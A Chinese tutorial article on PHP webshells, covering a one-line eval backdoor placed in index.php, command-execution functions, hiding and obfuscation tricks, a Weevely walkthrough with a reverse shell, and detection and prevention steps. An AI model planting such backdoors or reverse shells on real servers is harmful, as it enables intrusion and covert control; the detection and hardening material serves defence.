webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将 其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服 务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后 门，得到一个命令执行环境，以达到控制网站服务器的目的。

 顾名思义，"web"的含义是显然需要服务器开放web服务，"shell"的含义是取得对服务器某 种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操 作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 首先新建一个index.php文件，把PHP代码输入到里面，电脑可能会自动识别它为病毒，并删除，可以恢复后使用。

入侵PHP网站后在主页中创建**index.php**

```php
<?php @eval($_POST['shell']);?>
```

之后就可以通过POST访问到该文件，该文件形成一种命令执行环境，将请求报文中的字符串当做代码字符串处理（Shell环境）

#### Webshell常用的PHP函数

Webshell几乎适用于所有Web编程语言。之所以关注PHP，是因为它是web上使用最广泛的编程语言。

**system()**

system()函数将命令作为参数，并输出结果。

下面的示例是在Windows操作系统上运行dir命令，然后返回PHP文件所在目录的目录列表。

![img](https://pic1.zhimg.com/v2-a3d68f85cacdfb3e84be4fcdea8e9214_b.jpg)

 类似地，在Linux机器上执行ls命令也会得到类似的结果。

![img](https://pic4.zhimg.com/v2-e630a4e40b569d7662fefb782633529f_b.jpg)

**exec()**

exec()功能是将命令作为参数，但不输出结果。如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。

![img](https://pic3.zhimg.com/v2-e6a0a3a2f09a9ee64a03994e5f0596ba_b.jpg)

用exec()函数执行echo命令，只会输出最后一行命令结果。

![img](https://pic2.zhimg.com/v2-1feae6da3e3cd96c42950b80a14eadb1_b.jpg)

如果指定了第二个参数，则返回结果为数组

![img](https://pic4.zhimg.com/v2-9a8a639a55d98449789952668840f27b_b.jpg)

**shell_exec()**

shell_exec()函数类似于exec()，但是，其整个输出结果为字符串。

![img](https://pic2.zhimg.com/v2-f99eb1ea4f52afabd4378222366cf265_b.jpeg)

![img](https://pic3.zhimg.com/v2-517fbb2f207fd64773e92fd48b02e33a_b.jpeg)

**passthru()**

passthru()执行一个命令并返回原始格式的输出。

![img](https://pic3.zhimg.com/v2-1a725fc9239f588b56ffc096ddfeb3ca_b.jpg)

**proc_open()**

proc_open()函数可能很难理解。简单地说，我们可以使用proc_open()，创建一个处理程序（流程），实现脚本和要运行的程序之间的通信。

**倒引号**

很多PHP开发人员并没有意识到这一点，但是PHP会首先执行shell命令中倒引号（`）内的内容。请注意，倒引号（`）和单引号（’）不同。

![img](https://pic4.zhimg.com/v2-a68cd64e8054d4eac23ddcafe5fe1fef_b.jpg)

根据以上内容，下面是一个最简单的PHP Webshell。

![img](https://pic3.zhimg.com/v2-99160b40a91d6ed2f3c26dce60f37736_b.jpeg)

它使用 system()函数来执行通过 ‘cmd’ HTTP 请求中GET参数传递过来的命令。

![img](https://pic2.zhimg.com/v2-9d3ddd91eece84ce5b569af8b9e015b1_b.jpg)

我们已经确定了这些函数（以及其他一些函数）可能非常危险。更危险的是，在安装PHP时，默认情况下会启用所有这些内置PHP命令，而大多数系统管理员不会禁用这些函数。如果不确定在系统上是否启用了这些函数，输入以下内容将返回已启用的危险函数的列表。

![img](https://pic2.zhimg.com/v2-11f5ef63c2ef0f216ed9184af2cadcb5_b.jpeg)

在采用默认安装的情况下，下列函数是默认启用的。

![img](https://pic1.zhimg.com/v2-2f2a6db55525fd4252bf032433dd2d64_b.jpg)

### 隐藏Webshell

**修改报头**

黑客使用用户代理字符串而不是通过$_POST 请求参数来传递命令的。

![img](https://pic4.zhimg.com/v2-2d29b5f88a62bf449e33faff06966673_b.jpeg)

然后，黑客可以通过将命令放在User-Agent HTTP报头中来制作特定的HTTP请求。

![img](https://pic3.zhimg.com/v2-5ac73d1e93bf6dd18cb3e01196bae2e6_b.jpg)

![img](https://pic4.zhimg.com/v2-dc9273971c6c14050ceb52207772d0f7_b.jpg)

在服务器日志中可以看到这一行为的效果，其中第二个请求中的HTTP User-Agent被cat /etc/passwd命令替换了。

![img](https://pic1.zhimg.com/v2-d503b4bf9474c4d9c1023da141f2bfdc_b.jpeg)

上述方法会产生很大噪声，可以很容易地提示管理员查看服务器日志。但采用下列方法，管理员这很难发现。

![img](https://pic4.zhimg.com/v2-1f46b64795cfe8295ca5869448d606df_b.jpeg)

![img](https://pic1.zhimg.com/v2-9993a606bd2f6fa4b7cc6109c46e03f0_b.jpg)

这种方法没有留下关于执行命令的任何可见轨迹（至少在访问日志中是这样）。

![img](https://pic1.zhimg.com/v2-dca8cdc1c3e77a05128e49b78576dc3c_b.jpeg)

**隐藏在正常文件中**

黑客用来隐藏Webshell最简单的一个方法是将它们上传到深层子目录中和/或使用随机名称。

![img](https://pic3.zhimg.com/v2-032c4b3befa40408dc4ee946b8707f82_b.jpeg)

此外，一种更有效的方法是将Webshell代码嵌入到现有的合法文件中。

![img](https://pic2.zhimg.com/v2-7f694493ec1d75c4690ab0491b59c4e1_b.jpeg)

或使用CMS（例如WordPress）

![img](https://pic1.zhimg.com/v2-76ae4ef97d027bf57bafb3eaf0a6a60c_b.jpg)

![img](https://pic4.zhimg.com/v2-3efaf32f7301c7c76f9df7fc0db43bfb_b.jpg)

注意：黑客通常会在函数前使用@运算符，以防发生任何错误，写入错误日志。

**混淆**

黑客使用各种混淆技术，以避免被管理员检测到。他们不断提出新的更复杂的方法来隐藏其代码并绕过安全系统。下面是我们看到的一些最常用的技术。

（1）删除空格换行符

通过从代码块中删除空格换行符，代码看起来像一个大字符串，这就使得代码的可读性降低并且更难识别脚本要实现什么目的。

![img](https://pic3.zhimg.com/v2-139cd3a514becfbeb7e0a8015f4d340e_b.jpg)

（2）加密技术

该技术可以对代码进行加密，降低代码的可读性，并且充分利用运行时可以重建代码的各种函数。

![img](https://pic1.zhimg.com/v2-aea7062ed9b1c57bf6ce635697592824_b.jpg)

（3）使用Hex进行混淆

ASCII字符的十六进制值也可以用于进一步混淆Webshell命令，下面的例子可以很好地说明混淆技术在Webshell中的应用。

![img](https://pic3.zhimg.com/v2-21bae0709b4d6f63bf18e299989d78a6_b.jpeg)

以下是上述字符串的十六进制值。

![img](https://pic3.zhimg.com/v2-092739961953d0f1eb7f09f4f09d18be_b.jpeg)

因此，以下代码可用于接受十六进制编码的字符串并将其转化为PHP代码。

![img](https://pic4.zhimg.com/v2-a0a3b14d9fb5a1c1537533a37fdddf5b_b.jpg)

输出结果类似于下图。

![img](https://pic4.zhimg.com/v2-dc9273971c6c14050ceb52207772d0f7_b.jpg)

（4）通过可控输入实现混淆

PHP常用的可控输入包括: $_GET, $_POST, $_REQUEST,$_FILES,$_SERVER $_COOKIE等，是PHP预定义的变量，可以将黑客自定义的值传递给浏览器中。

以下示例很简单，但很实用。虽然未对代码进行编码或加密，但由于它没有使用任何可疑的函数名（例如eval()或assert()）、冗长的编码字符串、复杂的代码，因此与之前的代码相比，可检测性仍然较低。最重要的是，当管理员查看日志时，它不会引起任何危险。

![img](https://pic1.zhimg.com/v2-d71ae96bd5e89cb662c8f7669f28b7d4_b.jpg)

![img](https://pic2.zhimg.com/v2-06649feefcf76d796ea7e83320bb3cad_b.jpg)

## 04

## **Webshell如何使用**

我们以Weevely为例，来分析Webshell是如何使用的。Weevely是一个类似PHP telnet的轻量级Webshell，具有多个选项，在本示例中我们将使用这些选项。

为进行演示，我们将使用Weevely创建后门代理，部署在目标服务器上。我们只需要指定一个密码和一个文件名即可。然后用密码来访问后门。

![img](https://pic1.zhimg.com/v2-ce17ed9772e4d5fef84405025ecd6514_b.jpeg)

agent.php 包含以下编码文件。

![img](https://pic3.zhimg.com/v2-98ce3d44adc1d65efd8835dfee6fdd16_b.jpg)

将agent.php重命名为ma.php，然后将其上传到失陷的服务器。然后，我们不使用浏览器访问文件，而是使用shell连接到该文件。

![img](https://pic1.zhimg.com/v2-017e2c93adea51cf5c74f125e8170d60_b.jpeg)

![img](https://pic4.zhimg.com/v2-70f03f9b3b8363d9486b76c887093eab_b.jpg)

现在我们已经拥有了访问目标服务器的后门，可以执行命令了。

![img](https://pic4.zhimg.com/v2-c5a872a17bb700b2b2714e943709ee53_b.jpeg)

检查服务器的访问日志，我们会注意到有些奇怪。

![img](https://pic3.zhimg.com/v2-81cfd2899ad0429c90c0fc7019ae0bda_b.jpeg)

发送的请求已编码，来源网址也似乎是Google。如果我们要分析日志中是否有恶意活动，这非常有可能对我们造成困扰，因为Google应该是合法的引荐来源。当然，这是防止被检测出来的Webshell策略的一部分。

我们使用的Webshell的另一个有趣功能是反弹TCP Shell选项。这是指失陷的服务器将反向与我们建立连接，或者我们请求连接到Webshell。

在源计算机上，我们在端口8181上设置了Netcat侦听器。

![img](https://pic4.zhimg.com/v2-8598bbe43a5f35b54b703451af776b1f_b.jpeg)

使用已经建立的后门shell连接，启动反弹TCP请求。

![img](https://pic4.zhimg.com/v2-062cc8bc8a90bc597d47b75002041be7_b.jpeg)

现在已经建立了反弹shell连接（192.168.5.25 → 192.168.5.26）。

![img](https://pic1.zhimg.com/v2-ddd9eb8750fe774d86c08398b4f7937c_b.jpeg)

通过使用反弹TCP Shell控制服务器，而访问或错误日志中没有任何痕迹，因为通信是通过TCP（第4层）而不是HTTP（第7层）进行的。

## 05

## **Webshell检测和预防**

**检测**

 如果管理员怀疑其系统中存在Webshell或只是进行例行检查，则需要检查以下内容。

首先，必须针对Webshell正在使用的常见关键字过滤服务器访问和错误日志，包括文件名称和/或参数名称。您可根据下面的示例，在Apache HTTP Server访问日志中的URL中搜索字符串文件。

![img](https://pic4.zhimg.com/v2-b8345d6ce1f8d9116f21c7fa50f9205f_b.jpeg)

必须在文件系统（通常是Web服务器根目录）中搜索文件或文件名中的通用字符串。

![img](https://pic4.zhimg.com/v2-6287629060ee96321600db15326c2ab3_b.jpeg)

如果搜索到很长的字符串，这可能表示已进行了编码。一些后门程序具有数千行代码。

![img](https://pic1.zhimg.com/v2-770fbab08ca324f3d599ebb49db70920_b.jpg)

搜索最近X天修改过的文件。在以下示例中，我们搜索了前一天更改的* .php文件，但建议搜索所有更改过的文件，因为Webshell也可以嵌入到图像或任何其他文件中。

![img](https://pic4.zhimg.com/v2-f1ad6ef643f61edaef1960d3c8615357_b.jpg)

监视网络中存在异常的网络流量和连接。

![img](https://pic2.zhimg.com/v2-4e91a3f0bd40eddf103de423976a57dd_b.jpg)

分析.htaccess文件是否进行了修改。以下是攻击者可能对.htaccess文件进行更改的示例。

![img](https://pic4.zhimg.com/v2-a24c2529b38f18a0d7a2c3bbba0ccce3_b.jpeg)

**预防**

通常，黑客会利用Web服务器软件中存在的漏洞来安装Webshell。因此，消除这些漏洞对于避免失陷Web服务器的潜在风险很重要。以下是一些与Webshell相关的预防措施。

- 如果不使用，要禁用危险的PHP函数，例如exec()、shell_exec()、passthru()、system()、show_source()、proc_open()、pcntl_exec()、eval()与assert()。
- 如果必须要启用这些命令，请确保未授权用户无法访问这些脚本。此外，使用escapeshellarg()和escapeshellcmd()可以确保不能将用户输入注入到shell命令中，从而导致命令执行漏洞。
-  如果Web应用程序正在使用上传表单，请确保上传的表单是安全的，并且仅允许上传白名单所允许的文件类型。
- 不要相信用户输入的信息。
- 不要盲目使用在线论坛或网站上的代码。
- 对于WordPress，如果不需要，要避免安装第三方插件。如果需要使用插件，请确保插接件其信誉良好且经常更新。
- 在敏感目录（如图片或上传）中禁用PHP执行。
- 锁定Web服务器用户权限。

上面给出的是一些简单的Webshell检测和预防措施。面对较为复杂的Webshell攻击，则需要采用一些专业的Webshell检测工具来实现了。

## 06

## **总结** 

Webshell编码简单，使用方便，但由于许多Web服务器的设置方式问题，即使是一个简单的脚本也足以造成严重的破坏。这就是为什么有成千上万的公开Webshell的原因所在。Webshell存在如此多的变种，导致入侵检测和入侵防御系统（IDS/IPS）很难检测到它们，尤其是当使用签名来检测此类Webshell时。有些Webshell非常复杂，即使进行行为分析，也几乎无法检测到。

话虽如此，但Webshell只是漏洞利用后的实施工具，这就意味着首先要尽早检测出Webshell，防止其上传后进行漏洞利用。